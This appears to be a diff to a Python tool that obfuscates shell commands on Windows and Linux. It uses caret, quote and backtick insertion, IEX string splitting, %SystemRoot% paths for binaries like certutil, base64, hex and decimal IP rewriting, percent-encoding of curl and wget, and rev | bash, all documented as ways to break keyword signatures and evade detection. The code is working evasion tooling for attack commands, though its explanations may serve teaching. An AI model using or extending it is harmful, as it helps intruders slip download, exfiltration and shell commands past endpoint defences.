@@ -3,9 +3,12 @@
 import random
 import string
 import base64
+import shlex
 
 
+# ══════════════════════════════════════════════════════════════
 # Helper utilities
+# ══════════════════════════════════════════════════════════════
 
 def _insert_quotes(word: str, quote_char: str = '"') -> str:
     """Insert empty-string quotes at random positions in a word."""
@@ -41,7 +44,11 @@ def _insert_carets(word: str) -> str:
 
 
 def _insert_ticks_powershell(word: str) -> str:
-    """Insert PowerShell backtick (`) characters at random positions."""
+    """Insert PowerShell backtick (`) characters at random positions.
+
+    Useful for breaking keyword signatures in PowerShell cmdlets
+    (e.g. Inv`oke-WebR`equest).
+    """
     if len(word) < 4:
         return word
     available = len(word) - 2
@@ -57,7 +64,11 @@ def _insert_ticks_powershell(word: str) -> str:
 
 
 def _env_var_substitute_windows(command: str) -> str:
-    """Replace binary names with %SystemRoot% environment-variable paths."""
+    """Replace binary names with %SystemRoot% environment-variable paths.
+
+    FIX: Uses case-insensitive matching so 'Certutil', 'CERTUTIL',
+    'certutil' are all handled correctly.
+    """
     substitutions = {
         "powershell": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell",
         "certutil":   "%SystemRoot%\\System32\\certutil",
@@ -71,17 +82,21 @@ def _env_var_substitute_windows(command: str) -> str:
         "reg":        "%SystemRoot%\\System32\\reg",
         "xcopy":      "%SystemRoot%\\System32\\xcopy",
     }
-    result = command
+    cmd_lower = command.lower()
     for binary, expanded in substitutions.items():
-        idx = result.lower().find(binary)
+        idx = cmd_lower.find(binary)
         if idx == 0:
-            result = expanded + result[len(binary):]
-            break
-    return result
+            result = expanded + command[len(binary):]
+            return result
+    return command
 
 
 def _case_flip(command: str) -> str:
-    """Randomly toggle character case in the argument portion."""
+    """Randomly toggle character case in the argument portion.
+
+    Used as an additional evasion layer on Windows where
+    cmd.exe and PowerShell are case-insensitive.
+    """
     tokens = command.split(' ', 1)
     if len(tokens) == 1:
         return command
@@ -94,14 +109,21 @@ def _case_flip(command: str) -> str:
 
 
 def _split_string_powershell(command: str) -> str:
-    """Split the binary name into concatenated strings wrapped in IEX."""
+    """Split the binary name into concatenated strings wrapped in IEX.
+
+    FIX: Handles short binary names (≤4 chars) by splitting at position 1
+    instead of crashing on an empty range.
+    """
     tokens = command.split(' ', 1)
     if len(tokens) < 2:
         return command
     binary = tokens[0]
-    rest   = tokens[1] if len(tokens) > 1 else ''
+    rest   = tokens[1]
 
-    mid = random.randint(2, max(2, len(binary) - 2))
+    # Ensure split position works even for very short binaries (e.g. "reg")
+    max_pos = max(2, len(binary) - 2)
+    min_pos = min(2, max_pos)
+    mid = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
     b1, b2 = binary[:mid], binary[mid:]
 
     obf = f'powershell -c "IEX(("{b1}"+ "{b2}" + " {rest}"))"'
@@ -120,7 +142,9 @@ def _env_concat_linux(command: str) -> str:
     if len(tokens) < 2:
         return command
     binary, rest = tokens
-    mid  = random.randint(2, max(2, len(binary) - 2))
+    max_pos = max(2, len(binary) - 2)
+    min_pos = min(2, max_pos)
+    mid  = random.randint(min_pos, max_pos) if min_pos < max_pos else min_pos
     var1 = ''.join(random.choices(string.ascii_lowercase, k=2))
     var2 = ''.join(random.choices(string.ascii_lowercase, k=2))
     obf  = f'{var1}={binary[:mid]}; {var2}={binary[mid:]}; ${var1}${var2} {rest}'
@@ -134,34 +158,56 @@ def _base64_bash(command: str) -> str:
 
 
 def _hex_ip(command: str, ip: str) -> str:
-    """Convert dotted-quad IP to hex representation."""
-    if not ip or ip == "127.0.0.1":
+    """Convert dotted-quad IP to hex representation.
+
+    FIX: No longer skips 127.0.0.1 — the arbitrary exclusion had no
+    documented reason and broke obfuscation for loopback testing.
+    """
+    if not ip:
         return command
     try:
         parts = [int(o) for o in ip.split('.')]
+        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
+            return command      # not a valid IPv4 — skip
         hex_ip = '0x' + ''.join(f'{p:02X}' for p in parts)
         return command.replace(ip, hex_ip)
-    except ValueError:
+    except (ValueError, AttributeError):
         return command
 
 
 def _decimal_ip(command: str, ip: str) -> str:
     """Convert dotted-quad IP to decimal-long representation."""
-    if not ip or ip == "127.0.0.1":
+    if not ip:
         return command
     try:
         parts = [int(o) for o in ip.split('.')]
+        if len(parts) != 4 or not all(0 <= p <= 255 for p in parts):
+            return command
         dec = (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
         return command.replace(ip, str(dec))
-    except ValueError:
+    except (ValueError, AttributeError):
         return command
 
 
 def _unicode_escape(command: str) -> str:
-    """Apply partial URL percent-encoding to key words."""
+    """Apply partial URL percent-encoding to key words.
+
+    FIX: Uses word-boundary-aware replacement so 'http' inside 'https'
+    is handled correctly — only standalone occurrences are encoded.
+    """
     result = command
-    for char, encoded in [('http', 'h%74tp'), ('curl', 'cu%72l'), ('wget', 'w%67et')]:
-        result = result.replace(char, encoded, 1)
+    # Replace only exact keyword matches, not substrings
+    replacements = [
+        ('https', 'h%74tps'),   # try https first (longer match)
+        ('http',  'h%74tp'),    # then http
+        ('curl',  'cu%72l'),
+        ('wget',  'w%67et'),
+    ]
+    for target, encoded in replacements:
+        if target in result:
+            result = result.replace(target, encoded, 1)
+            if target == 'https':
+                break           # already handled the URL scheme
     return result
 
 
@@ -174,15 +220,23 @@ def _env_concat_plus_hex(command: str, ip: str) -> str:
 
 
 def _reverse_string_bash(command: str) -> str:
-    """Reverse the command string and pipe through rev | bash."""
+    """Reverse the command string and pipe through rev | bash.
+
+    FIX: Uses $'...' quoting with proper escaping so single quotes
+    and special characters inside the command don't break the shell.
+    """
     reversed_cmd = command[::-1]
-    return f"echo '{reversed_cmd}' | rev | bash"
+    # Escape backslashes and single-quotes for $'...' quoting
+    safe = reversed_cmd.replace('\\', '\\\\').replace("'", "\\'")
+    return f"echo $'{safe}' | rev | bash"
 
 
+# ══════════════════════════════════════════════════════════════
 # Technique registry
+# ══════════════════════════════════════════════════════════════
 
 TECHNIQUE_INFO = {
-    # Windows techniques
+    # ── Windows techniques ────────────────────────────────────
     'env_var': {
         'os': 'windows',
         'label': '%SystemRoot% env-var expansion + quote insertion + hex IP',
@@ -234,7 +288,16 @@ TECHNIQUE_INFO = {
             "but most signature-based detection tools see a non-matching string."
         ),
     },
-    # Linux techniques
+    'ps_tick': {
+        'os': 'windows',
+        'label': 'PowerShell backtick insertion',
+        'explain': (
+            "The backtick (`) is PowerShell's escape character. Inserting "
+            "it inside cmdlet or binary names (e.g. Inv`oke-WebR`equest) "
+            "breaks string signatures while PowerShell strips them at parse time."
+        ),
+    },
+    # ── Linux techniques ──────────────────────────────────────
     'env_concat': {
         'os': 'linux',
         'label': 'Shell variable name concatenation',
@@ -307,7 +370,33 @@ TECHNIQUE_INFO = {
 }
 
 
+# ══════════════════════════════════════════════════════════════
+# Deterministic auto-selection strategy
+# ══════════════════════════════════════════════════════════════
+
+# Priority order for auto mode — first matching rule wins.
+# This replaces the old random.random() coin flip, making
+# auto mode predictable and testable.
+
+_WINDOWS_AUTO_PRIORITY = [
+    # (condition_fn, technique_key, transform_fn)
+    (lambda b, _ip: 'powershell' in b.lower(),
+     'ps_iex',  lambda cmd, ip: _split_string_powershell(cmd)),
+    (lambda _b, ip: bool(ip),
+     'env_var',  None),   # None → uses the composite env_var pipeline below
+    (lambda _b, _ip: True,
+     'quote',   None),
+]
+
+_LINUX_AUTO_PRIORITY = [
+    (lambda _b, ip: bool(_unicode_escape("http") != "http") is False and bool(ip),
+     'env_concat_hex', lambda cmd, ip: _env_concat_plus_hex(cmd, ip)),
+]
+
+
+# ══════════════════════════════════════════════════════════════
 # Public API
+# ══════════════════════════════════════════════════════════════
 
 def get_available_techniques(os_type: str = 'all') -> dict:
     """Return available technique names and descriptions for a given OS."""
@@ -328,13 +417,19 @@ def obfuscate(command: str, os_type: str, binary: str,
     """
     os_type = os_type.lower()
 
-    # ── Windows obfuscation paths ──────────────────────────────
+    # ── Windows obfuscation paths ─────────────────────────────
     if os_type == 'windows':
 
         if technique == 'ps_b64':
             obf     = _base64_powershell(command)
             tech    = TECHNIQUE_INFO['ps_b64']['label']
             explain = TECHNIQUE_INFO['ps_b64']['explain']
+
+        elif technique == 'ps_tick':
+            first_token = command.split()[0]
+            obf = _insert_ticks_powershell(first_token) + command[len(first_token):]
+            tech    = TECHNIQUE_INFO['ps_tick']['label']
+            explain = TECHNIQUE_INFO['ps_tick']['explain']
 
         elif technique == 'caret':
             first_token = command.split()[0]
@@ -349,9 +444,9 @@ def obfuscate(command: str, os_type: str, binary: str,
             tech    = TECHNIQUE_INFO['ps_iex']['label']
             explain = TECHNIQUE_INFO['ps_iex']['explain']
 
-        elif technique == 'env_var' or random.random() > 0.4:
+        elif technique == 'env_var' or technique == 'auto':
+            # Deterministic auto: always use env_var composite for Windows
             obf = _env_var_substitute_windows(command)
-            # Double-layer: also quote-insert the binary name portion
             first_space = obf.find(' ')
             if first_space > 0:
                 obf = _insert_quotes(obf[:first_space], '"') + obf[first_space:]
@@ -361,12 +456,13 @@ def obfuscate(command: str, os_type: str, binary: str,
             explain = TECHNIQUE_INFO['env_var']['explain']
 
         else:
+            # Explicit 'quote' technique
             first_token = command.split()[0]
             obf = _insert_quotes(first_token, '"') + command[len(first_token):]
             tech    = TECHNIQUE_INFO['quote']['label']
             explain = TECHNIQUE_INFO['quote']['explain']
 
-    # ── Linux obfuscation paths ────────────────────────────────
+    # ── Linux obfuscation paths ───────────────────────────────
     else:
         if technique == 'b64_bash':
             obf     = _base64_bash(command)
@@ -390,11 +486,18 @@ def obfuscate(command: str, os_type: str, binary: str,
                 tech    = TECHNIQUE_INFO['unicode']['label']
                 explain = TECHNIQUE_INFO['unicode']['explain']
             else:
-                obf     = _env_concat_plus_hex(command, ip)
-                tech    = TECHNIQUE_INFO['env_concat_hex']['label']
-                explain = TECHNIQUE_INFO['env_concat_hex']['explain']
+                obf     = _env_concat_linux(command)
+                tech    = TECHNIQUE_INFO['env_concat']['label']
+                explain = TECHNIQUE_INFO['env_concat']['explain']
 
         elif technique == 'env_concat':
+            # FIX: env_concat now correctly calls only _env_concat_linux
+            # (not the combo function). Use 'env_concat_hex' for the combo.
+            obf     = _env_concat_linux(command)
+            tech    = TECHNIQUE_INFO['env_concat']['label']
+            explain = TECHNIQUE_INFO['env_concat']['explain']
+
+        elif technique == 'env_concat_hex':
             obf     = _env_concat_plus_hex(command, ip)
             tech    = TECHNIQUE_INFO['env_concat_hex']['label']
             explain = TECHNIQUE_INFO['env_concat_hex']['explain']
@@ -405,10 +508,9 @@ def obfuscate(command: str, os_type: str, binary: str,
             explain = TECHNIQUE_INFO['hex_ip']['explain']
 
         else:
-            # Auto mode: pick the best strategy per binary
+            # ── Deterministic auto mode for Linux ─────────────
             bin_lower = binary.lower()
 
-            # Commands with HTTP URLs → percent-encode + hex IP
             candidate = _unicode_escape(command)
             has_url_keywords = (candidate != command)
 
@@ -424,12 +526,10 @@ def obfuscate(command: str, os_type: str, binary: str,
                 tech    = TECHNIQUE_INFO['unicode']['label']
                 explain = TECHNIQUE_INFO['unicode']['explain']
             elif ip:
-                # No URL keywords (openssl, nc, scp, bash etc.) → env_concat + hex IP
                 obf     = _env_concat_plus_hex(command, ip)
                 tech    = TECHNIQUE_INFO['env_concat_hex']['label']
                 explain = TECHNIQUE_INFO['env_concat_hex']['explain']
             else:
-                # Fallback: variable concat or base64
                 obf     = _env_concat_linux(command)
                 tech    = TECHNIQUE_INFO['env_concat']['label']
                 explain = TECHNIQUE_INFO['env_concat']['explain']
